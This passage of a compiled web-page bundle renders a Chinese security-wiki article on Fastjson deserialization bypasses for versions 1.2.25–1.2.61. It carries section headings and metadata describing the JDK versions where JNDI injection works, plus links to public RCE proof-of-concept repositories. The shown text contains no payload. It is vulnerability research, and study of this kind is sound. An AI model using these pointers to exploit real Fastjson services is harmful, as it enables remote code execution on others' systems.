反序列化时默认使用的是无参构造函数（默认构造函数），而不是其他参数化的构造函数。</p><hr><p><strong>【不开启 AutoTypeSupport】</strong></p><p>​<img src="'+H+'" alt="image" loading="lazy">​</p><h2 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h2>',18),en={href:"https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC",target:"_blank",rel:"noopener noreferrer"},cn={href:"https://b1ue.cn/archives/184.html",target:"_blank",rel:"noopener noreferrer"},ln={href:"https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-03-Fastjson-%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90",target:"_blank",rel:"noopener noreferrer"},un={href:"https://github.com/jas502n/fastjson-1.2.58-rce",target:"_blank",rel:"noopener noreferrer"},rn={href:"https://javasec.org/java-vuls/FastJson.html",target:"_blank",rel:"noopener noreferrer"},kn=(0,t.Lk)("p",null,"‍",-1),dn=(0,t.Lk)("p",null,"‍",-1),mn=(0,t.Lk)("p",null,"‍",-1),vn=(0,t.Lk)("p",null,"‍",-1),gn=(0,t.Lk)("p",null,"‍",-1),bn={},yn=(0,a(7708).A)(bn,[["render",function(n,s){const a=(0,t.g2)("ExternalLinkIcon");return(0,t.uX)(),(0,t.CE)("div",null,[K,(0,t.Lk)("p",null,[(0,t.eW)("下面这个需要 "),(0,t.Lk)("a",V,[(0,t.eW)("Oracle JDBC 驱动"),(0,t.bF)(a)]),(0,t.eW)(" 添加到项目 lib 进行测试。")]),G,(0,t.Lk)("p",null,[(0,t.eW)("添加 "),(0,t.Lk)("a",$,[(0,t.eW)("commons-configuration"),(0,t.bF)(a)]),(0,t.eW)(" 依赖进行测试。")]),X,(0,t.Lk)("p",null,[(0,t.eW)("参考："),(0,t.Lk)("a",Y,[(0,t.eW)("jas502n/fastjson-1.2.60-rce: autoType enable (github.com)"),(0,t.bF)(a)])]),Q,(0,t.Lk)("p",null,[(0,t.Lk)("a",Z,[(0,t.eW)("jas502n/fastjson-1.2.61-RCE"),(0,t.bF)(a)])]),(0,t.Lk)("p",null,[(0,t.eW)("官方在 "),(0,t.Lk)("a",nn,[(0,t.eW)("https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java"),(0,t.bF)(a)]),(0,t.eW)(" 中，将 "),sn,(0,t.eW)("​ （即 1.2.61 8925522461579647174 0x7bddd363ad3998c6L "),an,(0,t.eW)("​）加入黑名单。")]),tn,(0,t.Lk)("p",null,[(0,t.Lk)("a",pn,[(0,t.eW)("Maven Repository: org.apache.commons » commons-configuration2"),(0,t.bF)(a)])]),on,(0,t.Lk)("ul",null,[(0,t.Lk)("li",null,[(0,t.Lk)("a",en,[(0,t.eW)("Fastjson 系列四——1.2.25-1.2.47 反序列化漏洞（无需开启 AutoType） [ Mi1k7ea ]"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",cn,[(0,t.eW)("Java 反序列化漏洞始末（3）— fastjson - 浅蓝 's blog (b1ue.cn)"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",ln,[(0,t.eW)("Java 反序列化 Fastjson 篇 03-Fastjson 各版本绕过分析 | Drunkbaby's Blog (drun1baby.top)"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",un,[(0,t.eW)("jas502n/fastjson-1.2.58-rce: fastjson-1.2.58-rce with h2 database (github.com)"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",rn,[(0,t.eW)("Fastjson 反序列化漏洞 · 攻击 Java Web 应用-[Java Web 安全] (javasec.org)"),(0,t.bF)(a)])])]),kn,dn,mn,vn,gn])}]]),qn=JSON.parse('{"path":"/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A2).html","title":"fastjson 反序列化 (Ⅲ) - Bypass AutoTypeSupport = True","lang":"zh-CN","frontmatter":{"title":"fastjson 反序列化 (Ⅲ) - Bypass AutoTypeSupport = True","description":"1.2.25 - 1.2.47 反序列化漏洞（无需开启 AutoType） 影响：Fastjson 1.2.x 系列的 1.2.25-1.2.47 版本 限制：主要是 JDK 版本对于 JDNI 注入的限制，基于 RMI 利用的 JDK 版本 <=6u141、7u131、8u121​，基于 LDAP 利用的 JDK 版本 <=6u211、7u201、8...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A2).html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"fastjson 反序列化 (Ⅲ) - Bypass AutoTypeSupport = True"}],["meta",{"property":"og:description","content":"1.2.25 - 1.2.47 反序列化漏洞（无需开启 AutoType） 影响：Fastjson 1.2.x 系列的 1.2.25-1.2.47 版本 限制：主要是 JDK 版本对于 JDNI 注入的限制，基于 RMI 利用的 JDK 版本 <=6u141、7u131、8u121​，基于 LDAP 利用的 JDK 版本 <=6u211、7u201、8..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"fastjson 反序列化 (Ⅲ) - Bypass AutoTypeSupport = True\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"1.2.25 - 1.2.47 反序列化漏洞（无需开启 AutoType）","slug":"_1-2-25-1-2-47-反序列化漏洞-无需开启-autotype","link":"#_1-2-25-1-2-47-反序列化漏洞-无需开启-autotype","children":[{"level":3,"title":"复现利用","slug":"复现利用","link":"#复现利用","children":[]},{"level":3,"title":"不受 AutoTypeSupport 影响的版本","slug":"不受-autotypesupport-影响的版本","link":"#不受-autotypesupport-影响的版本","children":[]},{"level":3,"title":"受 AutoTypeSupport 影响的版本","slug":"受-autotypesupport-影响的版本","link":"#受-autotypesupport-影响的版本","children":[]},{"level":3,"title":"其他混淆形式 POC","slug":"其他混淆形式-poc","link":"#其他混淆形式-poc","children":[]}]},{"level":2,"title":"1.2.48 补丁分析","slug":"_1-2-48-补丁分析","link":"#_1-2-48-补丁分析","children":[]},{"level":2,"title":"1.2.58 Bypass","slug":"_1-2-58-bypass","link":"#_1-2-58-bypass","children":[]},{"level":2,"title":"Fastjson <= 1.2.61","slug":"fastjson-1-2-61","link":"#fastjson-1-2-61","children":[{"level":3,"title":"需要开启 AutoTypeSupport","slug":"需要开启-autotypesupport","link":"#需要开启-autotypesupport","children":[]},{"level":3,"title":"无需开启 AutoTypeSupport【失败】","slug":"无需开启-autotypesupport【失败】","link":"#无需开启-autotypesupport【失败】","children":[]}]},{"level":2,"title":"前人栽树","slug":"前人栽树","link":"#前人栽树","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":14.35,"words":4304},"filePathRelative":"codereview/【JavaSec】漏洞分析/fastjson 反序列化 (Ⅲ).md","autoDesc":true}')}}]);